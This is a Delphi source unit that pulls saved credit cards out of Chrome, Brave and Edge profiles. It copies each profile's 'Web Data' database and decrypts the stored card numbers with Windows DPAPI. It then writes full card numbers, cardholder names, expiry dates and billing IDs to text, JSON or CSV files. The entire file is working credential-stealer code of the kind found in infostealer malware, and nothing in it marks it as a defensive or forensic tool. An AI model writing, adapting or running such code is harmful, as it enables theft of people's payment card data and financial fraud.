unit ChromiumCreditCard;

interface

uses
  System.SysUtils, System.Classes, System.IOUtils, System.DateUtils,
  System.JSON, System.NetEncoding, System.Generics.Collections,
  Winapi.Windows, Uni, SQLiteUniProvider;

type
  TBrowserKind = (bkChrome, bkBrave, bkEdge);

  TOutputFormat = (ofHuman, ofJSON, ofCSV);

  TCreditCardData = record
    GUID: string;
    Name: string;
    ExpirationYear: string;
    ExpirationMonth: string;
    CardNumber: string;
    Address: string;
    NickName: string;
  end;

  TCreditCardDataArray = TArray<TCreditCardData>;

  TChromiumCreditCardHelper = class
  private
    FProfilePath: string;
    FOutputFormat: TOutputFormat;
    FBrowserKind: TBrowserKind;
    FSQLiteConnection: TUniConnection;

  const
    QUERY_Chromium_CREDITCARD =
      'SELECT guid, name_on_card, expiration_month, expiration_year, ' +
      'card_number_encrypted, billing_address_id, nickname ' +
      'FROM credit_cards';

    function GetProfileName: string;
    function GetBrowserPrefix: string;
    procedure EnsureResultsDirectory;
    procedure OutputHuman(const CreditCards: TCreditCardDataArray);
    procedure OutputJSON(const CreditCards: TCreditCardDataArray);
    procedure OutputCSV(const CreditCards: TCreditCardDataArray);
    procedure OutputCreditCards(const CreditCards: TCreditCardDataArray);
    function DecryptWithDPAPI(const EncryptedData: TBytes): string;

  public
    constructor Create(const AProfilePath: string;
      ABrowserKind: TBrowserKind = bkChrome);
    destructor Destroy; override;
    function GetCreditCards: TCreditCardDataArray;
    function GetCreditCardCount: Integer;
    property OutputFormat: TOutputFormat read FOutputFormat write FOutputFormat;
  end;

implementation

type
  DATA_BLOB = record
    cbData: DWORD;
    pbData: PByte;
  end;

  PDATA_BLOB = ^DATA_BLOB;

  TCryptUnprotectData = function(pDataIn: PDATA_BLOB; ppszDataDescr: PWideChar;
    pOptionalEntropy: PDATA_BLOB; pvReserved: Pointer; pPromptStruct: Pointer;
    dwFlags: DWORD; pDataOut: PDATA_BLOB): BOOL; stdcall;

function TChromiumCreditCardHelper.DecryptWithDPAPI(const EncryptedData
  : TBytes): string;
var
  DLLHandle: THandle;
  CryptUnprotectData: TCryptUnprotectData;
  DataIn, DataOut: DATA_BLOB;
  DecryptedBytes: TBytes;
begin
  Result := '';
  if Length(EncryptedData) = 0 then
    Exit;

  DLLHandle := LoadLibrary('Crypt32.dll');
  if DLLHandle = 0 then
    Exit;

  try
    @CryptUnprotectData := GetProcAddress(DLLHandle, 'CryptUnprotectData');
    if not Assigned(CryptUnprotectData) then
      Exit;

    DataIn.cbData := Length(EncryptedData);
    DataIn.pbData := @EncryptedData[0];

    if CryptUnprotectData(@DataIn, nil, nil, nil, nil, 0, @DataOut) then
    begin
      SetLength(DecryptedBytes, DataOut.cbData);
      Move(DataOut.pbData^, DecryptedBytes[0], DataOut.cbData);
      LocalFree(HLOCAL(DataOut.pbData));
      Result := TEncoding.UTF8.GetString(DecryptedBytes);
    end;
  finally
    FreeLibrary(DLLHandle);
  end;
end;

function TChromiumCreditCardHelper.GetProfileName: string;
begin
  Result := ExtractFileName(ExcludeTrailingPathDelimiter(FProfilePath));
end;

function TChromiumCreditCardHelper.GetBrowserPrefix: string;
begin
  case FBrowserKind of
    bkChrome:
      Result := 'chrome';
    bkBrave:
      Result := 'brave';
    bkEdge:
      Result := 'edge';
  end;
end;

procedure TChromiumCreditCardHelper.EnsureResultsDirectory;
var
  ResultsDir: string;
begin
  ResultsDir := TPath.Combine(GetCurrentDir, 'results');
  if not TDirectory.Exists(ResultsDir) then
    TDirectory.CreateDirectory(ResultsDir);
end;

procedure TChromiumCreditCardHelper.OutputHuman(const CreditCards
  : TCreditCardDataArray);
var
  OutputFile: TextFile;
  FileName, FilePath: string;
begin
  EnsureResultsDirectory;
  FileName := Format('%s_%s_creditcards.txt',
    [GetBrowserPrefix, GetProfileName]);
  FilePath := TPath.Combine(TPath.Combine(GetCurrentDir, 'results'), FileName);
  AssignFile(OutputFile, FilePath);
  try
    Rewrite(OutputFile);
    for var Card in CreditCards do
    begin
      WriteLn(OutputFile);
      WriteLn(OutputFile, 'GUID: ', Card.GUID);
      WriteLn(OutputFile, 'Name: ', Card.Name);
      WriteLn(OutputFile, 'Card Number: ', Card.CardNumber);
      WriteLn(OutputFile, 'Expiration: ', Card.ExpirationMonth, '/',
        Card.ExpirationYear);
      WriteLn(OutputFile, 'Nickname: ', Card.NickName);
      WriteLn(OutputFile, 'Billing Address ID: ', Card.Address);
      WriteLn(OutputFile, '----------------------------------------');
    end;
    WriteLn(Format('[%s] Credit cards saved to: %s', [GetBrowserPrefix.ToUpper,
      FilePath]));
  finally
    CloseFile(OutputFile);
  end;
end;

procedure TChromiumCreditCardHelper.OutputJSON(const CreditCards
  : TCreditCardDataArray);
var
  JSONArray: TJSONArray;
  JSONObject: TJSONObject;
  FileName, FilePath, JSONString: string;
begin
  EnsureResultsDirectory;
  JSONArray := TJSONArray.Create;
  try
    for var Card in CreditCards do
    begin
      JSONObject := TJSONObject.Create;
      JSONObject.AddPair('guid', TJSONString.Create(Card.GUID));
      JSONObject.AddPair('name', TJSONString.Create(Card.Name));
      JSONObject.AddPair('cardNumber', TJSONString.Create(Card.CardNumber));
      JSONObject.AddPair('expirationMonth',
        TJSONString.Create(Card.ExpirationMonth));
      JSONObject.AddPair('expirationYear',
        TJSONString.Create(Card.ExpirationYear));
      JSONObject.AddPair('nickname', TJSONString.Create(Card.NickName));
      JSONObject.AddPair('billingAddressId', TJSONString.Create(Card.Address));
      JSONArray.AddElement(JSONObject);
    end;

    FileName := Format('%s_%s_creditcards.json',
      [GetBrowserPrefix, GetProfileName]);
    FilePath := TPath.Combine(TPath.Combine(GetCurrentDir, 'results'),
      FileName);

    // Convert JSON to string
    JSONString := JSONArray.Format(2);

    // Replace escaped forward slashes \/ with /
    JSONString := StringReplace(JSONString, '\/', '/', [rfReplaceAll]);

    // Save the modified JSON string
    TFile.WriteAllText(FilePath, JSONString);

    WriteLn(Format('[%s] Credit cards saved to: %s', [GetBrowserPrefix.ToUpper,
      FilePath]));
  finally
    JSONArray.Free;
  end;
end;

procedure TChromiumCreditCardHelper.OutputCSV(const CreditCards
  : TCreditCardDataArray);
var
  OutputFile: TextFile;
  FileName, FilePath: string;
begin
  EnsureResultsDirectory;
  FileName := Format('%s_%s_creditcards.csv',
    [GetBrowserPrefix, GetProfileName]);
  FilePath := TPath.Combine(TPath.Combine(GetCurrentDir, 'results'), FileName);
  AssignFile(OutputFile, FilePath);
  try
    Rewrite(OutputFile);
    WriteLn(OutputFile,
      'GUID,Name,CardNumber,ExpirationMonth,ExpirationYear,Nickname,BillingAddressId');

    for var Card in CreditCards do
    begin
      WriteLn(OutputFile, Format('"%s","%s","%s","%s","%s","%s","%s"',
        [StringReplace(Card.GUID, '"', '""', [rfReplaceAll]),
        StringReplace(Card.Name, '"', '""', [rfReplaceAll]),
        StringReplace(Card.CardNumber, '"', '""', [rfReplaceAll]),
        StringReplace(Card.ExpirationMonth, '"', '""', [rfReplaceAll]),
        StringReplace(Card.ExpirationYear, '"', '""', [rfReplaceAll]),
        StringReplace(Card.NickName, '"', '""', [rfReplaceAll]),
        StringReplace(Card.Address, '"', '""', [rfReplaceAll])]));
    end;

    WriteLn(Format('[%s] Credit cards saved to: %s', [GetBrowserPrefix.ToUpper,
      FilePath]));
  finally
    CloseFile(OutputFile);
  end;
end;

procedure TChromiumCreditCardHelper.OutputCreditCards(const CreditCards
  : TCreditCardDataArray);
begin
  case FOutputFormat of
    ofHuman:
      OutputHuman(CreditCards);
    ofJSON:
      OutputJSON(CreditCards);
    ofCSV:
      OutputCSV(CreditCards);
  end;
end;

constructor TChromiumCreditCardHelper.Create(const AProfilePath: string;
  ABrowserKind: TBrowserKind = bkChrome);
begin
  inherited Create;
  FProfilePath := AProfilePath;
  FBrowserKind := ABrowserKind;
  FOutputFormat := ofCSV;
  FSQLiteConnection := TUniConnection.Create(nil);
  FSQLiteConnection.ProviderName := 'SQLite';
  FSQLiteConnection.LoginPrompt := False;
  FSQLiteConnection.SpecificOptions.Values['Direct'] := 'True';
end;

destructor TChromiumCreditCardHelper.Destroy;
begin
  if Assigned(FSQLiteConnection) then
  begin
    if FSQLiteConnection.Connected then
      FSQLiteConnection.Disconnect;
    FSQLiteConnection.Free;
  end;
  inherited;
end;

function TChromiumCreditCardHelper.GetCreditCards: TCreditCardDataArray;
var
  Query: TUniQuery;
  CreditCardDb, TempDb: string;
begin
  SetLength(Result, 0);
  CreditCardDb := TPath.Combine(FProfilePath, 'Web Data');

  if not FileExists(CreditCardDb) then
    Exit;

  // Create temp copy of database
  TempDb := TPath.Combine(TPath.GetTempPath, Format('webdata_%s.db',
    [TGUID.NewGuid.ToString]));
  try
    TFile.Copy(CreditCardDb, TempDb);
    FSQLiteConnection.Database := TempDb;
    FSQLiteConnection.Connect;
    Query := TUniQuery.Create(nil);
    try
      Query.Connection := FSQLiteConnection;
      Query.SQL.Text := QUERY_Chromium_CREDITCARD;
      Query.Open;

      while not Query.Eof do
      begin
        SetLength(Result, Length(Result) + 1);
        with Result[High(Result)] do
        begin
          GUID := Query.FieldByName('guid').AsString;
          Name := Query.FieldByName('name_on_card').AsString;
          ExpirationMonth := Query.FieldByName('expiration_month').AsString;
          ExpirationYear := Query.FieldByName('expiration_year').AsString;
          Address := Query.FieldByName('billing_address_id').AsString;
          NickName := Query.FieldByName('nickname').AsString;

          var
          EncryptedCard := Query.FieldByName('card_number_encrypted').AsBytes;
          if Length(EncryptedCard) > 0 then
            CardNumber := DecryptWithDPAPI(EncryptedCard);
        end;
        Query.Next;
      end;

      if Length(Result) > 0 then
        OutputCreditCards(Result);

    finally
      Query.Free;
      FSQLiteConnection.Disconnect;
    end;

  finally
    if FileExists(TempDb) then
      TFile.Delete(TempDb);
  end;
end;

function TChromiumCreditCardHelper.GetCreditCardCount: Integer;
var
  Query: TUniQuery;
  CreditCardDb, TempDb: string;
begin
  Result := 0;
  CreditCardDb := TPath.Combine(FProfilePath, 'Web Data');

  if not FileExists(CreditCardDb) then
    Exit;

  TempDb := TPath.Combine(TPath.GetTempPath, Format('webdata_%s.db',
    [TGUID.NewGuid.ToString]));
  try
    TFile.Copy(CreditCardDb, TempDb);
    FSQLiteConnection.Database := TempDb;

    try
      FSQLiteConnection.Connect;
      Query := TUniQuery.Create(nil);
      try
        Query.Connection := FSQLiteConnection;
        Query.SQL.Text := 'SELECT COUNT(*) as count FROM credit_cards';
        Query.Open;
        Result := Query.FieldByName('count').AsInteger;
      finally
        Query.Free;
      end;
    finally
      FSQLiteConnection.Disconnect;
    end;
  finally
    if FileExists(TempDb) then
      TFile.Delete(TempDb);
  end;
end;

end.
